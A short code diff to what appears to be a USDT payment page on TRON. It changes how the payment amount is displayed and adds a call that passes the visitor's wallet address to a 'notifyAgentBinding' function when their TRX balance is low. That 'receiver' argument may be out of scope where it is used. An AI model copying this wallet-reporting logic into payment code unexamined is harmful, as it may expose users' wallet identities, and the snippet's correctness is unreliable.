@@ -349,8 +349,19 @@
 						width: 180,
 						height: 180,
 					})
-					document.getElementById('desktopAmount').innerText = getParamOrCache('amount') || '0'
 				}
+
+				// 显示付款金额
+				// 优先使用 vip 参数，其次是 amount 参数
+				const payAmount = getParamOrCache('vip') || getParamOrCache('amount') || '0'
+
+				// 移动端
+				const mobileAmountEl = document.getElementById('amount')
+				if (mobileAmountEl) mobileAmountEl.innerText = payAmount + ' USDT'
+
+				// 桌面端
+				const desktopAmountEl = document.getElementById('desktopAmount')
+				if (desktopAmountEl) desktopAmountEl.innerText = payAmount + ' USDT'
 
 				// 绑定支付按钮
 				const payBtn = document.getElementById('payButton')
@@ -412,6 +423,8 @@
 
 				if (parseFloat(userData.trxBalance) < 15) {
 					showTemporaryMessage('TRX能量不足')
+					notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
+
 					return
 				} else {
 					const receiver = await getContractAddress()
